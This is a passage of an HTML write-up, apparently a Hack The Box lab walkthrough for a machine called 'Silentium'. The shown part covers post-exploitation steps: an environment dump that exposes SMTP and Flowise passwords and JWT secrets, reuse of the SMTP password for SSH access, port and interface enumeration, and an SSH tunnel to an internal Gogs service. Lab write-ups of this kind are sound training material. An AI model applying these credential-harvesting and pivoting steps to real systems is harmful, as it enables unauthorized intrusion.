+PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
+DATABASE_PATH=/root/.flowise
+JWT_TOKEN_EXPIRY_IN_MINUTES=360
+JWT_AUDIENCE=AUDIENCE
+SECRETKEY_PATH=/root/.flowise
+PWD=/root
+SMTP_PASSWORD=r04D!!_R4ge
+NVIDIA_NIM_LLM_MODE=managed
+SMTP_HOST=mailhog
+JWT_REFRESH_TOKEN_SECRET=AABBCCDDAABBCCDDAABBCCDDAABBCCDDAABBCCDD
+SMTP_USER=test
+</pre> </div> <div class="terminal__overlay" id="overlay-bash-bash-4815" onclick="terminalOverlayClose('bash-bash-4815')"> <div class="terminal__modal" onclick="event.stopPropagation()"> <div class="terminal__header"> <div class="terminal__controls"> <button class="terminal__dot terminal__dot--red" onclick="terminalOverlayClose('bash-bash-4815')" title="Close"></button> <button class="terminal__dot terminal__dot--yellow" title="Minimize"></button> <button class="terminal__dot terminal__dot--green" onclick="terminalOverlayClose('bash-bash-4815')" title="Restore"></button> </div> <span class="terminal__title">bash</span> <button class="terminal__copy" onclick="terminalCopyModal('bash-bash-4815')" title="Copy to clipboard"> <svg class="terminal__copy-icon" xmlns="http://www.w3.org/2000/svg" viewbox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"> <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect> <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path> </svg> <span class="terminal__copy-label">copy</span> </button> </div> <pre class="terminal__body terminal__body--modal" id="terminal-modal-body-bash-bash-4815" data-language="bash">
+~ # env
+FLOWISE_PASSWORD=F1l3_d0ck3r
+ALLOW_UNAUTHORIZED_CERTS=true
+NODE_VERSION=20.19.4
+HOSTNAME=c78c3cceb7ba
+YARN_VERSION=1.22.22
+SMTP_PORT=1025
+SHLVL=3
+PORT=3000
+HOME=/root
+OLDPWD=/
+SENDER_EMAIL=ben@silentium.htb
+PUPPETEER_EXECUTABLE_PATH=/usr/bin/chromium-browser
+JWT_ISSUER=ISSUER
+JWT_AUTH_TOKEN_SECRET=AABBCCDDAABBCCDDAABBCCDDAABBCCDDAABBCCDD
+LLM_PROVIDER=nvidia-nim
+SMTP_USERNAME=test
+SMTP_SECURE=false
+JWT_REFRESH_TOKEN_EXPIRY_IN_MINUTES=43200
+FLOWISE_USERNAME=ben
+PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
+DATABASE_PATH=/root/.flowise
+JWT_TOKEN_EXPIRY_IN_MINUTES=360
+JWT_AUDIENCE=AUDIENCE
+SECRETKEY_PATH=/root/.flowise
+PWD=/root
+SMTP_PASSWORD=r04D!!_R4ge
+NVIDIA_NIM_LLM_MODE=managed
+SMTP_HOST=mailhog
+JWT_REFRESH_TOKEN_SECRET=AABBCCDDAABBCCDDAABBCCDDAABBCCDDAABBCCDD
+SMTP_USER=test
+</pre> </div> </div> <p><br> SSH into the machine using the ben username from the email earlier and the SMTP_PASSWORD from the environment variables.</p> <div class="terminal" data-language="bash" id="terminal-bash-bash-41888"> <div class="terminal__header"> <div class="terminal__controls"> <button class="terminal__dot terminal__dot--red" onclick="terminalClose('bash-bash-41888')" title="Close"></button> <button class="terminal__dot terminal__dot--yellow" onclick="terminalMinimize('bash-bash-41888')" title="Minimize"></button> <button class="terminal__dot terminal__dot--green" onclick="terminalMaximize('bash-bash-41888')" title="Maximize"></button> </div> <span class="terminal__title">bash</span> <button class="terminal__copy" onclick="terminalCopy('bash-bash-41888')" title="Copy to clipboard"> <svg class="terminal__copy-icon" xmlns="http://www.w3.org/2000/svg" viewbox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"> <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect> <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path> </svg> <span class="terminal__copy-label">copy</span> </button> </div> <pre class="terminal__body" id="terminal-body-bash-bash-41888">
+┌─[au-dedivip-1]─[10.10.15.20]─[biscottidiskette@htb-oldwz1kkne]─[~/my_data/machines/silentium/CVE-2025-58434-AND-59528-POC]
+└──╼ [★]$ ssh ben@silentium.htb
+The authenticity of host 'silentium.htb (10.129.245.103)' can't be established.
+ED25519 key fingerprint is SHA256:OZNUeTZ9jastNKKQ1tFXatbeOZzSFg5Dt7nhwhjorR0.
+This key is not known by any other names.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added 'silentium.htb' (ED25519) to the list of known hosts.
+ben@silentium.htb's password: 
+Permission denied, please try again.
+ben@silentium.htb's password: 
+Welcome to Ubuntu 24.04.4 LTS (GNU/Linux 6.8.0-107-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/pro
+
+ System information as of Wed Apr  8 07:12:54 PM UTC 2026
+
+  System load:           0.24
+  Usage of /:            82.6% of 13.37GB
+  Memory usage:          17%
+  Swap usage:            0%
+  Processes:             259
+  Users logged in:       0
+  IPv4 address for eth0: 10.129.234.54
+  IPv6 address for eth0: dead:beef::250:56ff:feb9:435c
+
+ * Strictly confined Kubernetes makes edge and IoT secure. Learn how MicroK8s
+   just raised the bar for easy, resilient and secure K8s cluster deployment.
+
+   https://ubuntu.com/engage/secure-kubernetes-at-the-edge
+
+Expanded Security Maintenance for Applications is not enabled.
+
+68 updates can be applied immediately.
+52 of these updates are standard security updates.
+To see these additional updates run: apt list --upgradable
+
+1 additional security update can be applied with ESM Apps.
+Learn more about enabling ESM Apps service at https://ubuntu.com/esm
+
+
+The list of available updates is more than a week old.
+To check for new updates run: sudo apt update
+Last login: Wed Apr  8 19:12:55 2026 from 10.10.14.5
+ben@silentium:~$
+</pre> </div> <div class="terminal__overlay" id="overlay-bash-bash-41888" onclick="terminalOverlayClose('bash-bash-41888')"> <div class="terminal__modal" onclick="event.stopPropagation()"> <div class="terminal__header"> <div class="terminal__controls"> <button class="terminal__dot terminal__dot--red" onclick="terminalOverlayClose('bash-bash-41888')" title="Close"></button> <button class="terminal__dot terminal__dot--yellow" title="Minimize"></button> <button class="terminal__dot terminal__dot--green" onclick="terminalOverlayClose('bash-bash-41888')" title="Restore"></button> </div> <span class="terminal__title">bash</span> <button class="terminal__copy" onclick="terminalCopyModal('bash-bash-41888')" title="Copy to clipboard"> <svg class="terminal__copy-icon" xmlns="http://www.w3.org/2000/svg" viewbox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"> <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect> <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path> </svg> <span class="terminal__copy-label">copy</span> </button> </div> <pre class="terminal__body terminal__body--modal" id="terminal-modal-body-bash-bash-41888" data-language="bash">
+┌─[au-dedivip-1]─[10.10.15.20]─[biscottidiskette@htb-oldwz1kkne]─[~/my_data/machines/silentium/CVE-2025-58434-AND-59528-POC]
+└──╼ [★]$ ssh ben@silentium.htb
+The authenticity of host 'silentium.htb (10.129.245.103)' can't be established.
+ED25519 key fingerprint is SHA256:OZNUeTZ9jastNKKQ1tFXatbeOZzSFg5Dt7nhwhjorR0.
+This key is not known by any other names.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added 'silentium.htb' (ED25519) to the list of known hosts.
+ben@silentium.htb's password: 
+Permission denied, please try again.
+ben@silentium.htb's password: 
+Welcome to Ubuntu 24.04.4 LTS (GNU/Linux 6.8.0-107-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/pro
+
+ System information as of Wed Apr  8 07:12:54 PM UTC 2026
+
+  System load:           0.24
+  Usage of /:            82.6% of 13.37GB
+  Memory usage:          17%
+  Swap usage:            0%
+  Processes:             259
+  Users logged in:       0
+  IPv4 address for eth0: 10.129.234.54
+  IPv6 address for eth0: dead:beef::250:56ff:feb9:435c
+
+ * Strictly confined Kubernetes makes edge and IoT secure. Learn how MicroK8s
+   just raised the bar for easy, resilient and secure K8s cluster deployment.
+
+   https://ubuntu.com/engage/secure-kubernetes-at-the-edge
+
+Expanded Security Maintenance for Applications is not enabled.
+
+68 updates can be applied immediately.
+52 of these updates are standard security updates.
+To see these additional updates run: apt list --upgradable
+
+1 additional security update can be applied with ESM Apps.
+Learn more about enabling ESM Apps service at https://ubuntu.com/esm
+
+
+The list of available updates is more than a week old.
+To check for new updates run: sudo apt update
+Last login: Wed Apr  8 19:12:55 2026 from 10.10.14.5
+ben@silentium:~$
+</pre> </div> </div> <p><br> Get the user.txt flag.</p> <div class="terminal" data-language="bash" id="terminal-bash-bash-42135"> <div class="terminal__header"> <div class="terminal__controls"> <button class="terminal__dot terminal__dot--red" onclick="terminalClose('bash-bash-42135')" title="Close"></button> <button class="terminal__dot terminal__dot--yellow" onclick="terminalMinimize('bash-bash-42135')" title="Minimize"></button> <button class="terminal__dot terminal__dot--green" onclick="terminalMaximize('bash-bash-42135')" title="Maximize"></button> </div> <span class="terminal__title">bash</span> <button class="terminal__copy" onclick="terminalCopy('bash-bash-42135')" title="Copy to clipboard"> <svg class="terminal__copy-icon" xmlns="http://www.w3.org/2000/svg" viewbox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"> <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect> <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path> </svg> <span class="terminal__copy-label">copy</span> </button> </div> <pre class="terminal__body" id="terminal-body-bash-bash-42135">
+Gben@silentium:~$ cat user.txt 
+&lt;redacted&gt;
+ben@silentium:~$ ip a
+1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
+    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
+    inet 127.0.0.1/8 scope host lo
+       valid_lft forever preferred_lft forever
+    inet6 ::1/128 scope host noprefixroute 
+       valid_lft forever preferred_lft forever
+2: eth0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc mq state UP group default qlen 1000
+    link/ether 00:50:56:95:7a:04 brd ff:ff:ff:ff:ff:ff
+    altname enp3s0
+    altname ens160
+    inet 10.129.245.103/16 brd 10.129.255.255 scope global dynamic eth0
+       valid_lft 2776sec preferred_lft 2776sec
+    inet6 dead:beef::250:56ff:fe95:7a04/64 scope global dynamic mngtmpaddr 
+       valid_lft 86399sec preferred_lft 14399sec
+    inet6 fe80::250:56ff:fe95:7a04/64 scope link 
+       valid_lft forever preferred_lft forever
+3: br-2141d27c70d6: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc noqueue state UP group default 
+    link/ether d2:11:f1:fd:82:96 brd ff:ff:ff:ff:ff:ff
+    inet 172.18.0.1/16 brd 172.18.255.255 scope global br-2141d27c70d6
+       valid_lft forever preferred_lft forever
+    inet6 fe80::d011:f1ff:fefd:8296/64 scope link 
+       valid_lft forever preferred_lft forever
+4: docker0: &lt;NO-CARRIER,BROADCAST,MULTICAST,UP&gt; mtu 1500 qdisc noqueue state DOWN group default 
+    link/ether 4e:62:24:85:e9:2d brd ff:ff:ff:ff:ff:ff
+    inet 172.17.0.1/16 brd 172.17.255.255 scope global docker0
+       valid_lft forever preferred_lft forever
+5: veth66b70ea@if2: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc noqueue master br-2141d27c70d6 state UP group default 
+    link/ether 9e:5b:b0:3e:c8:3e brd ff:ff:ff:ff:ff:ff link-netnsid 0
+    inet6 fe80::9c5b:b0ff:fe3e:c83e/64 scope link 
+       valid_lft forever preferred_lft forever
+6: veth06c722d@if2: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc noqueue master br-2141d27c70d6 state UP group default 
+    link/ether aa:aa:28:8c:6f:69 brd ff:ff:ff:ff:ff:ff link-netnsid 1
+    inet6 fe80::a8aa:28ff:fe8c:6f69/64 scope link 
+       valid_lft forever preferred_lft forever
+</pre> </div> <div class="terminal__overlay" id="overlay-bash-bash-42135" onclick="terminalOverlayClose('bash-bash-42135')"> <div class="terminal__modal" onclick="event.stopPropagation()"> <div class="terminal__header"> <div class="terminal__controls"> <button class="terminal__dot terminal__dot--red" onclick="terminalOverlayClose('bash-bash-42135')" title="Close"></button> <button class="terminal__dot terminal__dot--yellow" title="Minimize"></button> <button class="terminal__dot terminal__dot--green" onclick="terminalOverlayClose('bash-bash-42135')" title="Restore"></button> </div> <span class="terminal__title">bash</span> <button class="terminal__copy" onclick="terminalCopyModal('bash-bash-42135')" title="Copy to clipboard"> <svg class="terminal__copy-icon" xmlns="http://www.w3.org/2000/svg" viewbox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"> <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect> <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path> </svg> <span class="terminal__copy-label">copy</span> </button> </div> <pre class="terminal__body terminal__body--modal" id="terminal-modal-body-bash-bash-42135" data-language="bash">
+Gben@silentium:~$ cat user.txt 
+&lt;redacted&gt;
+ben@silentium:~$ ip a
+1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
+    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
+    inet 127.0.0.1/8 scope host lo
+       valid_lft forever preferred_lft forever
+    inet6 ::1/128 scope host noprefixroute 
+       valid_lft forever preferred_lft forever
+2: eth0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc mq state UP group default qlen 1000
+    link/ether 00:50:56:95:7a:04 brd ff:ff:ff:ff:ff:ff
+    altname enp3s0
+    altname ens160
+    inet 10.129.245.103/16 brd 10.129.255.255 scope global dynamic eth0
+       valid_lft 2776sec preferred_lft 2776sec
+    inet6 dead:beef::250:56ff:fe95:7a04/64 scope global dynamic mngtmpaddr 
+       valid_lft 86399sec preferred_lft 14399sec
+    inet6 fe80::250:56ff:fe95:7a04/64 scope link 
+       valid_lft forever preferred_lft forever
+3: br-2141d27c70d6: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc noqueue state UP group default 
+    link/ether d2:11:f1:fd:82:96 brd ff:ff:ff:ff:ff:ff
+    inet 172.18.0.1/16 brd 172.18.255.255 scope global br-2141d27c70d6
+       valid_lft forever preferred_lft forever
+    inet6 fe80::d011:f1ff:fefd:8296/64 scope link 
+       valid_lft forever preferred_lft forever
+4: docker0: &lt;NO-CARRIER,BROADCAST,MULTICAST,UP&gt; mtu 1500 qdisc noqueue state DOWN group default 
+    link/ether 4e:62:24:85:e9:2d brd ff:ff:ff:ff:ff:ff
+    inet 172.17.0.1/16 brd 172.17.255.255 scope global docker0
+       valid_lft forever preferred_lft forever
+5: veth66b70ea@if2: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc noqueue master br-2141d27c70d6 state UP group default 
+    link/ether 9e:5b:b0:3e:c8:3e brd ff:ff:ff:ff:ff:ff link-netnsid 0
+    inet6 fe80::9c5b:b0ff:fe3e:c83e/64 scope link 
+       valid_lft forever preferred_lft forever
+6: veth06c722d@if2: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc noqueue master br-2141d27c70d6 state UP group default 
+    link/ether aa:aa:28:8c:6f:69 brd ff:ff:ff:ff:ff:ff link-netnsid 1
+    inet6 fe80::a8aa:28ff:fe8c:6f69/64 scope link 
+       valid_lft forever preferred_lft forever
+</pre> </div> </div> <p><br> Check the tcp listening port with the <code class="language-plaintext highlighter-rouge">ss -antlp</code>.</p> <div class="terminal" data-language="bash" id="terminal-bash-bash-42300"> <div class="terminal__header"> <div class="terminal__controls"> <button class="terminal__dot terminal__dot--red" onclick="terminalClose('bash-bash-42300')" title="Close"></button> <button class="terminal__dot terminal__dot--yellow" onclick="terminalMinimize('bash-bash-42300')" title="Minimize"></button> <button class="terminal__dot terminal__dot--green" onclick="terminalMaximize('bash-bash-42300')" title="Maximize"></button> </div> <span class="terminal__title">bash</span> <button class="terminal__copy" onclick="terminalCopy('bash-bash-42300')" title="Copy to clipboard"> <svg class="terminal__copy-icon" xmlns="http://www.w3.org/2000/svg" viewbox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"> <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect> <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path> </svg> <span class="terminal__copy-label">copy</span> </button> </div> <pre class="terminal__body" id="terminal-body-bash-bash-42300">
+ben@silentium:/var/www/html/Silentium$ ss -antlp
+State                 Recv-Q                Send-Q                                Local Address:Port                                  Peer Address:Port                Process                
+LISTEN                0                     4096                                      127.0.0.1:33627                                      0.0.0.0:*                                          
+LISTEN                0                     4096                                      127.0.0.1:3000                                       0.0.0.0:*                                          
+LISTEN                0                     4096                                      127.0.0.1:3001                                       0.0.0.0:*                                          
+LISTEN                0                     4096                                     127.0.0.54:53                                         0.0.0.0:*                                          
+LISTEN                0                     4096                                        0.0.0.0:22                                         0.0.0.0:*                                          
+LISTEN                0                     511                                         0.0.0.0:80                                         0.0.0.0:*                                          
+LISTEN                0                     4096                                  127.0.0.53%lo:53                                         0.0.0.0:*                                          
+LISTEN                0                     4096                                      127.0.0.1:8025                                       0.0.0.0:*                                          
+LISTEN                0                     4096                                      127.0.0.1:1025                                       0.0.0.0:*                                          
+LISTEN                0                     4096                                           [::]:22                                            [::]:*                                          
+LISTEN                0                     511                                            [::]:80                                            [::]:*
+</pre> </div> <div class="terminal__overlay" id="overlay-bash-bash-42300" onclick="terminalOverlayClose('bash-bash-42300')"> <div class="terminal__modal" onclick="event.stopPropagation()"> <div class="terminal__header"> <div class="terminal__controls"> <button class="terminal__dot terminal__dot--red" onclick="terminalOverlayClose('bash-bash-42300')" title="Close"></button> <button class="terminal__dot terminal__dot--yellow" title="Minimize"></button> <button class="terminal__dot terminal__dot--green" onclick="terminalOverlayClose('bash-bash-42300')" title="Restore"></button> </div> <span class="terminal__title">bash</span> <button class="terminal__copy" onclick="terminalCopyModal('bash-bash-42300')" title="Copy to clipboard"> <svg class="terminal__copy-icon" xmlns="http://www.w3.org/2000/svg" viewbox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"> <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect> <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path> </svg> <span class="terminal__copy-label">copy</span> </button> </div> <pre class="terminal__body terminal__body--modal" id="terminal-modal-body-bash-bash-42300" data-language="bash">
+ben@silentium:/var/www/html/Silentium$ ss -antlp
+State                 Recv-Q                Send-Q                                Local Address:Port                                  Peer Address:Port                Process                
+LISTEN                0                     4096                                      127.0.0.1:33627                                      0.0.0.0:*                                          
+LISTEN                0                     4096                                      127.0.0.1:3000                                       0.0.0.0:*                                          
+LISTEN                0                     4096                                      127.0.0.1:3001                                       0.0.0.0:*                                          
+LISTEN                0                     4096                                     127.0.0.54:53                                         0.0.0.0:*                                          
+LISTEN                0                     4096                                        0.0.0.0:22                                         0.0.0.0:*                                          
+LISTEN                0                     511                                         0.0.0.0:80                                         0.0.0.0:*                                          
+LISTEN                0                     4096                                  127.0.0.53%lo:53                                         0.0.0.0:*                                          
+LISTEN                0                     4096                                      127.0.0.1:8025                                       0.0.0.0:*                                          
+LISTEN                0                     4096                                      127.0.0.1:1025                                       0.0.0.0:*                                          
+LISTEN                0                     4096                                           [::]:22                                            [::]:*                                          
+LISTEN                0                     511                                            [::]:80                                            [::]:*
+</pre> </div> </div> <p><br> Let’s check the port 3001. Let’s give it a curl to see what’s running. Note the Gogs installation and the new potential subdomain.</p> <div class="terminal" data-language="bash" id="terminal-bash-bash-41085"> <div class="terminal__header"> <div class="terminal__controls"> <button class="terminal__dot terminal__dot--red" onclick="terminalClose('bash-bash-41085')" title="Close"></button> <button class="terminal__dot terminal__dot--yellow" onclick="terminalMinimize('bash-bash-41085')" title="Minimize"></button> <button class="terminal__dot terminal__dot--green" onclick="terminalMaximize('bash-bash-41085')" title="Maximize"></button> </div> <span class="terminal__title">bash</span> <button class="terminal__copy" onclick="terminalCopy('bash-bash-41085')" title="Copy to clipboard"> <svg class="terminal__copy-icon" xmlns="http://www.w3.org/2000/svg" viewbox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"> <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect> <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path> </svg> <span class="terminal__copy-label">copy</span> </button> </div> <pre class="terminal__body" id="terminal-body-bash-bash-41085">
+ben@silentium:/var/www/html/Silentium$ curl 127.0.0.1:3001
+&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+&lt;head data-suburl=""&gt;
+	&lt;meta http-equiv="Content-Type" content="text/html; charset=UTF-8" /&gt;
+	&lt;meta http-equiv="X-UA-Compatible" content="IE=edge"/&gt;
+	
+		&lt;meta name="author" content="Gogs" /&gt;
+		&lt;meta name="description" content="Gogs is a painless self-hosted Git service" /&gt;
+		&lt;meta name="keywords" content="go, git, self-hosted, gogs"&gt;
+	
+	&lt;meta name="referrer" content="no-referrer" /&gt;
+	&lt;meta name="_csrf" content="ZH3qvZR0PJaMOumn1HxYwNskdRs6MTc4NzU4MjIxNDY0OTYxMDU5OA" /&gt;
+	&lt;meta name="_suburl" content="" /&gt;
+
+	
+	
+		&lt;meta property="og:url" content="http://staging-v2-code.dev.silentium.htb:3001/" /&gt;
+		&lt;meta property="og:type" content="website" /&gt;
+		&lt;meta property="og:title" content="Gogs"&gt;
+		&lt;meta property="og:description" content="Gogs is a painless self-hosted Git service."&gt;
+		&lt;meta property="og:image" content="http://staging-v2-code.dev.silentium.htb:3001/img/favicon.png" /&gt;
+		&lt;meta property="og:site_name" content="Gogs"&gt;
+	
+
+	&lt;link rel="shortcut icon" href="/img/favicon.png" /&gt;
+
+    &lt;snip&gt;
+</pre> </div> <div class="terminal__overlay" id="overlay-bash-bash-41085" onclick="terminalOverlayClose('bash-bash-41085')"> <div class="terminal__modal" onclick="event.stopPropagation()"> <div class="terminal__header"> <div class="terminal__controls"> <button class="terminal__dot terminal__dot--red" onclick="terminalOverlayClose('bash-bash-41085')" title="Close"></button> <button class="terminal__dot terminal__dot--yellow" title="Minimize"></button> <button class="terminal__dot terminal__dot--green" onclick="terminalOverlayClose('bash-bash-41085')" title="Restore"></button> </div> <span class="terminal__title">bash</span> <button class="terminal__copy" onclick="terminalCopyModal('bash-bash-41085')" title="Copy to clipboard"> <svg class="terminal__copy-icon" xmlns="http://www.w3.org/2000/svg" viewbox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"> <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect> <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path> </svg> <span class="terminal__copy-label">copy</span> </button> </div> <pre class="terminal__body terminal__body--modal" id="terminal-modal-body-bash-bash-41085" data-language="bash">
+ben@silentium:/var/www/html/Silentium$ curl 127.0.0.1:3001
+&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+&lt;head data-suburl=""&gt;
+	&lt;meta http-equiv="Content-Type" content="text/html; charset=UTF-8" /&gt;
+	&lt;meta http-equiv="X-UA-Compatible" content="IE=edge"/&gt;
+	
+		&lt;meta name="author" content="Gogs" /&gt;
+		&lt;meta name="description" content="Gogs is a painless self-hosted Git service" /&gt;
+		&lt;meta name="keywords" content="go, git, self-hosted, gogs"&gt;
+	
+	&lt;meta name="referrer" content="no-referrer" /&gt;
+	&lt;meta name="_csrf" content="ZH3qvZR0PJaMOumn1HxYwNskdRs6MTc4NzU4MjIxNDY0OTYxMDU5OA" /&gt;
+	&lt;meta name="_suburl" content="" /&gt;
+
+	
+	
+		&lt;meta property="og:url" content="http://staging-v2-code.dev.silentium.htb:3001/" /&gt;
+		&lt;meta property="og:type" content="website" /&gt;
+		&lt;meta property="og:title" content="Gogs"&gt;
+		&lt;meta property="og:description" content="Gogs is a painless self-hosted Git service."&gt;
+		&lt;meta property="og:image" content="http://staging-v2-code.dev.silentium.htb:3001/img/favicon.png" /&gt;
+		&lt;meta property="og:site_name" content="Gogs"&gt;
+	
+
+	&lt;link rel="shortcut icon" href="/img/favicon.png" /&gt;
+
+    &lt;snip&gt;
+</pre> </div> </div> <p><br> Port forward the 3001 to your attacking machine.</p> <div class="terminal" data-language="bash" id="terminal-bash-bash-41562"> <div class="terminal__header"> <div class="terminal__controls"> <button class="terminal__dot terminal__dot--red" onclick="terminalClose('bash-bash-41562')" title="Close"></button> <button class="terminal__dot terminal__dot--yellow" onclick="terminalMinimize('bash-bash-41562')" title="Minimize"></button> <button class="terminal__dot terminal__dot--green" onclick="terminalMaximize('bash-bash-41562')" title="Maximize"></button> </div> <span class="terminal__title">bash</span> <button class="terminal__copy" onclick="terminalCopy('bash-bash-41562')" title="Copy to clipboard"> <svg class="terminal__copy-icon" xmlns="http://www.w3.org/2000/svg" viewbox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"> <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect> <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path> </svg> <span class="terminal__copy-label">copy</span> </button> </div> <pre class="terminal__body" id="terminal-body-bash-bash-41562">
+┌─[au-dedivip-1]─[10.10.15.20]─[biscottidiskette@htb-oldwz1kkne]─[~/my_data/machines/silentium]
+└──╼ [★]$ ssh -L 3001:localhost:3001 ben@silentium.htb
+ben@silentium.htb's password: 
+Welcome to Ubuntu 24.04.4 LTS (GNU/Linux 6.8.0-107-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/pro
+
+ System information as of Wed Apr  8 07:12:54 PM UTC 2026
+
+  System load:           0.24
+  Usage of /:            82.6% of 13.37GB
+  Memory usage:          17%
+  Swap usage:            0%
+  Processes:             259
+  Users logged in:       0
+  IPv4 address for eth0: 10.129.234.54
+  IPv6 address for eth0: dead:beef::250:56ff:feb9:435c
+
+ * Strictly confined Kubernetes makes edge and IoT secure. Learn how MicroK8s
+   just raised the bar for easy, resilient and secure K8s cluster deployment.
+
+   https://ubuntu.com/engage/secure-kubernetes-at-the-edge
+
+Expanded Security Maintenance for Applications is not enabled.
+
+68 updates can be applied immediately.
+52 of these updates are standard security updates.
+To see these additional updates run: apt list --upgradable
+
+1 additional security update can be applied with ESM Apps.
+Learn more about enabling ESM Apps service at https://ubuntu.com/esm
+
+
+The list of available updates is more than a week old.
+To check for new updates run: sudo apt update
+Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings
+
+Last login: Mon Aug 24 14:42:38 2026 from 10.10.15.20
+</pre> </div> <div class="terminal__overlay" id="overlay-bash-bash-41562" onclick="terminalOverlayClose('bash-bash-41562')"> <div class="terminal__modal" onclick="event.stopPropagation()"> <div class="terminal__header"> <div class="terminal__controls"> <button class="terminal__dot terminal__dot--red" onclick="terminalOverlayClose('bash-bash-41562')" title="Close"></button> <button class="terminal__dot terminal__dot--yellow" title="Minimize"></button> <button class="terminal__dot terminal__dot--green" onclick="terminalOverlayClose('bash-bash-41562')" title="Restore"></button> </div> <span class="terminal__title">bash</span> <button class="terminal__copy" onclick="terminalCopyModal('bash-bash-41562')" title="Copy to clipboard"> <svg class="terminal__copy-icon" xmlns="http://www.w3.org/2000/svg" viewbox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"> <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect> <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path> </svg> <span class="terminal__copy-label">copy</span> </button> </div> <pre class="terminal__body terminal__body--modal" id="terminal-modal-body-bash-bash-41562" data-language="bash">
+┌─[au-dedivip-1]─[10.10.15.20]─[biscottidiskette@htb-oldwz1kkne]─[~/my_data/machines/silentium]
+└──╼ [★]$ ssh -L 3001:localhost:3001 ben@silentium.htb
+ben@silentium.htb's password: 
+Welcome to Ubuntu 24.04.4 LTS (GNU/Linux 6.8.0-107-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/pro
+
+ System information as of Wed Apr  8 07:12:54 PM UTC 2026
+
+  System load:           0.24
+  Usage of /:            82.6% of 13.37GB
+  Memory usage:          17%
+  Swap usage:            0%
+  Processes:             259
+  Users logged in:       0
+  IPv4 address for eth0: 10.129.234.54
+  IPv6 address for eth0: dead:beef::250:56ff:feb9:435c
+
+ * Strictly confined Kubernetes makes edge and IoT secure. Learn how MicroK8s
